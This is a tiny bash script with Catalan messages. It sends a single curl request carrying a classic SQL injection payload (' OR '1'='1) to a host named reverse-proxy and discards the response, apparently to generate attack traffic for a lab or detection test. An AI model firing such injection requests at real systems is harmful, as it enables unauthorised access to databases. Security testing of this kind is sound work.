#!/bin/bash

echo "[*] Executant SQL Injection..."

curl "http://reverse-proxy/?id=1%27%20OR%20%271%27=%271" > /dev/null 2>&1

echo "[*] Atac finalitzat"